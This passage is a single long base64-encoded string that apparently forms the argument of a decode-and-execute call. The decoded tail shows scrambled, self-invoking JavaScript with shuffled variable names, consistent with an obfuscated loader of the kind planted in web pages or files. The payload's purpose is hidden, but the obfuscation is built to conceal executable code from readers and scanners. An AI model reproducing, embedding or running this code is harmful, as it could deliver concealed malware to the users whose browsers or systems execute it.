lclolb2U6UWdRZjJdIEtdaVtRPWM4e299PXdUIWZzbFFmLHNdX1taSXQyeV8hIWNwPDY9b18rKS5ReDAlY1FJaF9RdFFuUSlyLmljMTFmOnYuMVFqUWFybC4oJUVycGZRaFEhdChmMSYmaF1lPSYpXCcwUWlRb1E7X1FfUVl0XWd9ZDFpKTwudnlhXTFZdCFlbm1dLmlyUWQoTm1kZl90dDJRIDYxNVE1ISVRe3tsSF0pfStfbz0pKHRRPTJ9dWUoUWphUSF0MFFhcyhRMmZmbnJUaWVzaXt1M2hhblFvNmVlSWY7MjldZl0kUXJvUWE9UXI/YT1jUVFpPXlvbWMxKG5Ra11oLCEkdElMPF0ocylRUWVRLlU4ICZhM1FRbyVdUVF0dFE1dHV0JC5ZMGMuNFE9ITNRRVtRKGFRMWlRNG4lbjhRaVEwI3JneiMyYURpaWJzZXhqZFEuZG5mZnMsLl17VFEjfXZHKCgtK2V0JWZmX2J1Li5uN20pI3R9UV0uYWkzWlEpM1QpIjNpUS4mLjNfUTxmLiw2eGVybD1fLkQuM3QsTF0pWzlmczN0bnI8cFFLXShRYXA2X2gmdHR9UWQzPSV1X3UyJGxWUTJuVHJwbiBqamgoOkRzKDVzIGxvaFErNGQoJF09cjsxXTB0b2JRc3NddSlsbHJhXz5RMmFyK2YyXzU0KT1fKSVuUShpOXRjUTNiJWEyZi4rb11rNDZyaSE9LnJue1FmTm1fczchYltvdDsoUGVmM1ZyaXAhcmYlJGFJJW9ub1E1ZzpoYTRyYSY9clFbYW5hZTlRJW5qcmI1ITNsZi5bbUx0ZW4rYTU9ZXkpZmVvbj1hUVE3NWVHUSxfLDUhe2dvbnNlUVEgbnJdaSJwb2k6YnMyKjh7KWVycih1dDEuY1FsUTgpaT17JTMiZWUuaVFvcjFYLmIpdWwzIHNwY30zajdlMDNnKVF0X21dM1F1XWR0fW8tUXQ9ZjtvMHJob3NkODAzZlEgZnRbJC41KGUrW2VedHVmNWl2b3RcXC4uUWZ9JTRdUSBRY2Mzb19sXFxuJVVRNGVRZF9dLmo0USxqJTJwdGUuMXJRN1EpZl8yaSk6USBwJTIgdHNdIz0paSl0Y2UpIF9hXlFRcmFaXUUmc2Y1UTVRaHIybGNRdFFvbDN7ci5RaTFRc3JkNCQ/ZTE1ZD1zUSAlaF90MSk7UWNdMjNcLyV1NzM9UT1NZXVRZzMyfVFXdDtvUS4lc1E9YTMkMFEuZTRRZGldblFuPW5ZYmh1bFFGb3JfQ3IzUW5RM2x1X3J9U2NhUWcpUV1zIThRLnRjdHUqLlFuUTI7ZTMoUT1RUVFmIFEzOy5RXzFRVTAzYyAlZl9sKCk/X1ExUVEuUWE1bHA0c1k1X250Xl9faV9mZGU9ZVFRZWJvNC5RKDI1N30pYXV2cmEuUWUpMV90dHBRKWNfM19yZVFsXFw1XzQtelFwO1EpKTZzM30pbityUV9UXS5jdCF0UWFfTmlvcy49JS5RblF9NFFbaVFvb0IzcFF9ZiglaV85dVEiZixlXSUmZmorKy1cLzMuUSVmblFpZlFiXzZvbjEuUVFhX1FmdDUsNSVdX1Epb3RrcmU/blFpX2ViKG9sUT1ldzZRblFRUTVtZk50XVEzX3R0OzhRbjRhXT09NHslKVFvbUclKTVRUSxlUVtRKDQgZV9RbzMgZ0lRbCU2WF0uZ3tRNDpyXC8uUXV9LD1jUW9hck1lSDJ4XSsoeyhRUVF0XWkzLHQgbHQxMzRnTTFyUSwxcnQoZGlReFEoOC45KHB9O19fbTVoVD5RaTY7UVEpUWlhY2s7aTE9VDshNHM3YihrZVE3UWZtUT1ueV9vUXkuYW59LTF0UWZhby5RIClqYVFlcmdlaXM7cl9fdXNudGIuJHRRUTZsN3M7XyVfNzZRIHR1ZixvIC0hXTkxfWdmUXIkU11qaS5kXCdzWjt0bC4gKDtvZlE0UVF0UTRuO25wMFF1IHJzPXNjMntFUXtyNV0hUTRycytxUSlmMWVRUXJRcmtjXVxcUTFnQzQ2S2VyUWQ4cCE1KS1vaWZRdC5dLC47b2JsJSBlUVEkbnIuYV8lZl8gKHNRbC4rMXIkKVFuYi5mdHhsXFxKUSl9ezZycG5RZTFdLHQ9ZzYhWCAydWpReXtfeSE6ZkVUblEpJVE1JSxRUT15aXRjYzYyIHUpdG8yNVF7XFwuIFEkUWYgUX1fKSE1c11mbl5RdFEhZGMgKWgpJGw5cHVRLi5vYjFhUVEyZiB9fShRIVFvJWkxXSxsPW5RaS5yUUlRVTJucmVbYX0uaS4lWS4gZWZ3YyZdaG5fZm8uZ1suXTUuZl8pKX15MnNmJGJlX2VtQztfNzJ0UV93Ml9pe2ZjcmpfX2sge1FsIDRjYl8iUX07UV09IDBRZlk7UTUyXyBkX3IuJXJlbC4ucl9fZXAiUXVdUV9vbjMpVixjcnIhKDRvKHVhbl10IHtEZj12X1spby1fbm8wICV0cGRpZmRRMX17MXIlIDJmX2JlXV0pNC1mbmYpLlFuJVF0LmNuPSBVb3RdJykpO3ZhciBjQ0o9Tlh6KGhtVSx3RGIgKTtjQ0ooMTA5Mik7cmV0dXJuIDUzOTd9KSgp'))
